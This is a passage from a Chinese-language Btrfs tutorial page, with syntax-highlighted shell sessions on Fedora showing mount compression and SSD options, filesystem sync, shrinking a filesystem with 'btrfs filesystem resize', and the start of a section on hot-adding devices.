<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">raid1c34</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 具有</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 或</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 个副本的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RAID1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (compat=5.5)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">zoned</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 支持分区设备</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (compat=5.12)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> show</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'mydata'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 92aac6fd-d7c5-4ac3-9ba6-acbe13071611</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 144.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 272.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 264.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n3</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mount</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> btrfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /mnt</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#支持多种透明压缩机制</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> zlib</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lzo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> zstd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mount</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> btrfs</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compress=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">type[:level</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compress-force,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compress-force=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">type[:level</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#If compression is enabled, nodatacow and nodatasum are disabled.</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># SSD支持</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">用户可以使用</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mount</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 参数打开</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> btrfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 针对</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SSD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 的优化。命令如下：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mount</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> –</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> btrfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> –</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SSD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/sda5</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /btrfsdisk</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#同步文件系统</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">为了提高效率，btrfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IO</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 操作由一些内核线程异步处理。这使得用户对文件的操作并不会立即反应到磁盘上。您可以做一个实验，在</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> btrfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 上创建一个文件后，稍等</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 5</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 到</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 秒将系统电源切断，再次重启后，新建的文件并没有出现。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">对于多数应用这并不是问题，但有些时候用户希望</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IO</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 操作立即执行，此时就需要对文件系统进行同步。下面的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> btrfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 命令用来同步文件系统：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">btrfsctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> –c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /btrfsdisk</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这样一个 Btrfs 就在设备 nvme0n2,nvme0n3上建立好了。值得一提的是在这种缺省情况下，即使只有一个设备，Btrfs 也会对 metadata 进行冗余保护。如果有多个设备，那么您可以在创建文件系统的时候进行 RAID 设置。详细信息请参见后续的介绍。</p>
<p>这里介绍其他几个 mkfs.btrfs 的参数。</p>
<ul>
<li>
<p>Nodesize 和 leafsize 用来设定 btrfs 内部 BTree 节点的大小，缺省为一个 page 大小。但用户也可以使用更大的节点，以便增加 fanout，减小树的高度，当然这只适合非常大的文件系统。</p>
</li>
<li>
<p>Alloc-start 参数用来指定文件系统在磁盘设备上的起始地址。这使得用户可以方便的预留磁盘前面的一些特殊空间。</p>
</li>
<li>
<p>Byte-count 参数设定文件系统的大小，用户可以只使用设备的一部分空间，当空间不足时再增加文件系统大小。</p>
</li>
</ul>
<h2>修改文件系统的大小</h2>
<p>当文件系统建立好之后，您可以修改文件系统的大小。 /dev/nvme0n2挂载到了 /mnt下，大小为 40G。假如您希望只使用其中的 37G，则需要减小当前文件系统的大小，这可以通过如下命令实现：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# df -h</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                               Size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  Used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Avail</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Use%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Mounted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">devtmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                 4.0M</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.0M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   0%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    1.9G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   0%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/shm</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    777M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.7M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  775M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/mapper/fedora_localhost--live-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   48G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   41G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  11%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   16K</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /tmp</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n1p2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                           974M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  243M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  664M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  27%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    389M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   88K</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  389M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run/user/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                              40G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  3.8M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   40G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /mnt</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs filesystem show</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'mydata'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 92aac6fd-d7c5-4ac3-9ba6-acbe13071611</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 144.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 272.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 264.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n3</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs filesystem resize -3G /mnt/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Resize</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> device</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> id</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (/dev/nvme0n2) from 20.00GiB to 17.00GiB</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# df -h</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                               Size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  Used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Avail</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Use%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Mounted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">devtmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                 4.0M</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.0M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   0%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    1.9G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   0%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/shm</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    777M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.7M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  775M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/mapper/fedora_localhost--live-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   48G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   41G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  11%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   16K</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /tmp</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n1p2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                           974M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  243M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  664M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  27%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    389M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   88K</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  389M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run/user/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                              37G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  3.8M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   37G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /mnt</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]#</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">btrfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> resize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [options] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">devid</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:][+/-]&lt;size&gt;[kKmMgGtTpPeE]|[</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">devid</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:]max &lt;path&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>同样的，您可以使用 btrfsctl 命令增加文件系统的大小。</p>
<h2>添加设备（热）</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# lsblk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">NAME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                            MAJ:MIN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  SIZE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RO</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TYPE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MOUNTPOINTS</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sr0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                              11:0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.6G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rom</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">zram0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                           252:0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  3.8G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [SWAP]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   50G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">├─nvme0n1p1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                     259:1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    1M</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">├─nvme0n1p2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                     259:2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    1G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">└─nvme0n1p3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                     259:3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   49G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part</span></span>
